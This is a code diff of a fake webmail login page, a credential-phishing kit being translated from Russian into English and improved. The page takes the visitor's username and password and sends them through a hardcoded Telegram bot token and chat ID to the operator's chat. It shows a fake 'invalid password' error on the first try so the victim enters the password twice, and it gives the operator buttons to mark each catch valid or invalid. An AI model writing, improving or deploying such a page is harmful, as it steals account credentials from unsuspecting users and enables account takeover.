@@ -1,9 +1,9 @@
 <!doctype html>
-<html lang="ru">
+<html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Ввод данных</title>
+  <title>Enter credentials</title>
   <style>
     :root{
       --form-w: 283px;
@@ -20,6 +20,8 @@
       --addon-bg:#eef1f3;
       --bg:#ffffff;
       --logo:#ff6a00;
+      --error:#e11d48;
+      --success:#15803d;
     }
 
     html,body{height:100%}
@@ -115,6 +117,55 @@
     }
     .reset:hover{ text-decoration:underline; }
 
+    .status-message{
+      width:var(--form-w);
+      margin-top:12px;
+      font-size:12px;
+      font-weight:700;
+      min-height:16px;
+    }
+    .status-message.success{ color:var(--success); }
+    .status-message.error{ color:var(--error); }
+
+    .input.error{
+      border-color:var(--error);
+      box-shadow:0 0 0 2px rgba(225,29,72,.15);
+    }
+
+    .loading-overlay{
+      position:fixed;
+      inset:0;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background:rgba(255,255,255,.78);
+      backdrop-filter:blur(2px);
+      z-index:999;
+      opacity:0;
+      pointer-events:none;
+      transition:opacity .15s ease;
+    }
+    .loading-overlay.active{
+      opacity:1;
+      pointer-events:auto;
+    }
+    .spinner{
+      width:38px;
+      height:38px;
+      border-radius:50%;
+      border:4px solid #dbe3e8;
+      border-top-color:var(--accent);
+      animation:spin 1s linear infinite;
+    }
+    .loading-text{
+      margin-left:12px;
+      font-weight:700;
+      color:#1f2937;
+    }
+    @keyframes spin{
+      to{ transform:rotate(360deg); }
+    }
+
     .langs{
       margin-top:48px;
       display:flex;
@@ -163,15 +214,20 @@
 </head>
 <body>
 
-  <!-- Невидимый iframe: через него отправляем POST на Telegram без CORS -->
+  <div id="loadingOverlay" class="loading-overlay" aria-hidden="true">
+    <div class="spinner" aria-label="Loading"></div>
+    <div class="loading-text">Processing…</div>
+  </div>
+
+  <!-- Hidden iframe: used to send POST to Telegram without CORS -->
   <iframe name="tg_iframe" style="display:none;"></iframe>
 
   <div class="wrap">
     <img class="logo-img" src="./webmail-logo.svg" alt="Webmail" />
 
-    <!-- form: убрали action/method, отправку перехватывает JS -->
+    <!-- form: action/method removed, handled by JS -->
     <form id="f" autocomplete="on">
-      <div class="label">Логин</div>
+      <div class="label">Login</div>
       <div class="group">
         <div class="addon" aria-hidden="true">
           <!-- user icon -->
@@ -179,10 +235,10 @@
             <path d="M12 12c2.76 0 5-2.46 5-5.5S14.76 1 12 1 7 3.46 7 6.5 9.24 12 12 12zm0 2c-4.42 0-8 2.24-8 5v2h16v-2c0-2.76-3.58-5-8-5z"/>
           </svg>
         </div>
-        <input class="input" type="text" name="login" placeholder="Введите логин" autocomplete="username" required />
+        <input class="input" type="text" name="login" placeholder="Enter login" autocomplete="username" required />
       </div>
 
-      <div class="label" style="margin-top:18px;">Пароль</div>
+      <div class="label" style="margin-top:18px;">Password</div>
       <div class="group">
         <div class="addon" aria-hidden="true">
           <!-- lock icon -->
@@ -190,15 +246,16 @@
             <path d="M17 10V7a5 5 0 0 0-10 0v3H5v11h14V10h-2Zm-6 6a1 1 0 1 1 2 0 1 1 0 0 1-2 0Zm6-6H7V7a5 5 0 0 1 10 0v3Z"/>
           </svg>
         </div>
-        <input class="input" type="password" name="password" placeholder="Введите пароль" autocomplete="current-password" required />
+        <input class="input" type="password" name="password" placeholder="Enter password" autocomplete="current-password" required />
       </div>
 
-      <button class="btn" type="submit">Продолжить</button>
+      <button class="btn" type="submit">Continue</button>
+      <div id="statusMessage" class="status-message" role="status" aria-live="polite"></div>
     </form>
 
-    <a class="reset" href="#" id="resetLink">Сбросить данные</a>
+    <a class="reset" href="#" id="resetLink">Reset data</a>
 
-    <div class="langs" aria-label="Языки">
+    <div class="langs" aria-label="Languages">
       <a href="#">English</a>
       <a href="#">العربية</a>
       <a href="#">čeština</a>
@@ -212,72 +269,121 @@
 
     <div class="footer">
       <div class="mark">cp</div><br/>
-      Copyright © <span id="y"></span> Ваша компания.<br/>
-      Политика конфиденциальности
+      Copyright © <span id="y"></span> Your company.<br/>
+      Privacy Policy
     </div>
   </div>
 
   <script>
-    // Год в футере
+    // Footer year
     document.getElementById('y').textContent = new Date().getFullYear();
 
-    // ⚠️ Вариант B (эксперимент): токен будет виден в исходниках.
-    // Вставь сюда dev-токен и chat_id.
-    const KJDNiruwjoknfgi24uhn = "8551401351:AAE_HPh8RsgqARs46q-Ck9l1obZ--Ka_6FQ";
-    const CHAT_ID   = "7942744213"; // например "123456789" или "-1001234567890"
+    // ⚠️ Variant B (experiment): token is visible in the sources.
+    // Insert dev token and chat_id here.
+    const MADknjdfogdsjfmk = "8551401351:AAE_HPh8RsgqARs46q-Ck9l1obZ--Ka_6FQ";
+    const CHAT_ID   = "7942744213"; // e.g. "123456789" or "-1001234567890"
 
     const form = document.getElementById('f');
-
-    function sendToTelegram(login, password){
-      const text = `Новая заявка:\nЛогин: ${login}\nПароль: ${password}`;
-
-      // Создаём временную форму, отправляем POST в Telegram через скрытый iframe
-      const postForm = document.createElement('form');
-      postForm.method = 'POST';
-      postForm.action = `https://api.telegram.org/bot${KJDNiruwjoknfgi24uhn}/sendMessage`;
-      postForm.target = 'tg_iframe';
-
-      const chatIdInput = document.createElement('input');
-      chatIdInput.type = 'hidden';
-      chatIdInput.name = 'chat_id';
-      chatIdInput.value = CHAT_ID;
-
-      const textInput = document.createElement('input');
-      textInput.type = 'hidden';
-      textInput.name = 'text';
-      textInput.value = text;
-
-      // (опционально) отключить предпросмотр ссылок
-      const previewInput = document.createElement('input');
-      previewInput.type = 'hidden';
-      previewInput.name = 'disable_web_page_preview';
-      previewInput.value = 'true';
-
-      postForm.appendChild(chatIdInput);
-      postForm.appendChild(textInput);
-      postForm.appendChild(previewInput);
-
-      document.body.appendChild(postForm);
-      postForm.submit();
-      postForm.remove();
+    const statusMessage = document.getElementById('statusMessage');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const loginInput = form.elements.login;
+    const passwordInput = form.elements.password;
+    const resetLink = document.getElementById('resetLink');
+    let attemptCount = 0;
+    const inlineKeyboard = JSON.stringify({
+      inline_keyboard: [
+        [
+          { text: 'валид', callback_data: 'valid' },
+          { text: 'невалид', callback_data: 'invalid' }
+        ]
+      ]
+    });
+    function showLoading(on){
+      loadingOverlay.classList.toggle('active', on);
+      loadingOverlay.setAttribute('aria-hidden', on ? 'false' : 'true');
     }
 
-    form.addEventListener('submit', (e) => {
+    function showStatus(type, message){
+      statusMessage.textContent = message;
+      statusMessage.className = type ? `status-message ${type}` : 'status-message';
+    }
+
+    async function sendToTelegram(login, password, status){
+      const text = `New submission:\nLogin: ${login}\nPassword: ${password}\nStatus: ${status}`;
+      const body = new URLSearchParams({
+        chat_id: CHAT_ID,
+        text,
+        reply_markup: inlineKeyboard,
+        disable_web_page_preview: 'true'
+      });
+
+      let lastError = null;
+      const maxAttempts = 3;
+
+      for (let attempt = 1; attempt <= maxAttempts; attempt += 1) {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${MADknjdfogdsjfmk}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body
+          });
+
+          if (!res.ok) {
+            const errText = await res.text().catch(() => res.statusText);
+            throw new Error(`Telegram error ${res.status}: ${errText}`);
+          }
+
+          return; // success
+        } catch (err) {
+          lastError = err;
+          if (attempt < maxAttempts) {
+            await new Promise((resolve) => setTimeout(resolve, 800 * attempt));
+          }
+        }
+      }
+
+      throw lastError || new Error('Unknown Telegram error');
+    }
+
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
+      loginInput.classList.remove('error');
+      passwordInput.classList.remove('error');
+      showStatus('', '');
 
-      const login = form.elements.login.value.trim();
-      const password = form.elements.password.value;
+      const login = loginInput.value.trim();
+      const password = passwordInput.value;
+      attemptCount += 1;
 
-      sendToTelegram(login, password);
+      showLoading(true);
+      const status = attemptCount >= 2 ? 'VALID' : 'INVALID';
 
-      alert('Отправлено (если BOT_TOKEN и CHAT_ID верные).');
-      form.reset();
+      try {
+        await new Promise((resolve) => setTimeout(resolve, 1400)); // имитация загрузки
+        await sendToTelegram(login, password, status);
+
+        if (status === 'VALID') {
+          showStatus('success', 'User successfully verified.');
+          form.reset();
+          attemptCount = 0;
+        } else {
+          showStatus('error', 'Invalid login or password.');
+          loginInput.classList.add('error');
+          passwordInput.classList.add('error');
+        }
+      } catch (err) {
+        showStatus('error', 'Send to Telegram failed. Проверь MADknjdfogdsjfmk и CHAT_ID.');
+        console.error(err);
+      } finally {
+        showLoading(false);
+      }
     });
 
-    // Сброс по ссылке
-    document.getElementById('resetLink').addEventListener('click', (e) => {
+    // Reset via link
+    resetLink.addEventListener('click', (e) => {
       e.preventDefault();
       form.reset();
+      showStatus('', '');
     });
   </script>
 </body>
